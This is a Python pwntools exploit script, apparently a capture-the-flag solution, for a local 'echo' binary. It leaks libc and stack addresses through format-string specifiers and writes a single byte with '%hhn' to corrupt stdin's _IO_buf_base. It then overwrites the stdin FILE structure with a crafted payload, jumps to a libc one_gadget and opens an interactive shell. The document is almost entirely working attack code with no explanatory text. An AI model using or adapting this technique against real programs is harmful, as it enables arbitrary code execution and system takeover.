#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './echo'
elf = ELF(binary)
libc = elf.libc

#io = process(binary, env = {"LD_PRELOAD" : './libc_echo.so.6'})
io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30

def menu(idx):
    io.recvuntil('>> ')
    io.sendline(str(idx))

def setnm(nm):
    menu(1)
    io.recvuntil(":")
    io.send(nm)

def echo(l, w):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(l))
    sleep(0.1)
    io.send(w)

echo(-1, "%3$p")
io.recvuntil(":")
libc_addr = int(io.recvuntil("---")[:-3], 16) - 0xf72c0
log.info("\033[33m" + hex(libc_addr) + "\033[0m")
echo(-1, "%p")
io.recvuntil(":")
stack_addr = int(io.recvuntil("---")[:-3], 16)
log.info("\033[33m" + hex(stack_addr) + "\033[0m")

# one NULL byte write
setnm(p64(libc_addr + 0x3c48e0 + 0x38)[:-1]) # the addr of _IO_buf_base
echo(-1, '%16$hhn')

# now _IO_buf_base -> _IO_write_base
# the next scanf will overwrite the stdin
payload = ''
payload += p64(libc_addr + 0x3c48e0 + 0x20 + 0x63) * 3# current _IO_buf_end
stack_addr += 0x26f8
payload += p64(stack_addr)
payload += p64(stack_addr + 12)
payload += p64(0) * 6
payload += p64(0xffffffffffffffff)
payload += p64(0)
payload += p64(libc_addr + 0x3c6790)
payload += p64(0xffffffffffffffff)
payload += p64(0)
payload += p64(libc_addr + 0x3c49c0)
payload += p64(0) * 3
payload += p64(0x00000000ffffffff)
payload += p64(0) * 2
payload += p64(0)

echo(payload, 'a')

gdb.attach(io, '')
for i in range(0, 0x63):
    echo('1', '1')

one = libc_addr + 0xf1147
echo(p64(one), '1')

io.interactive()
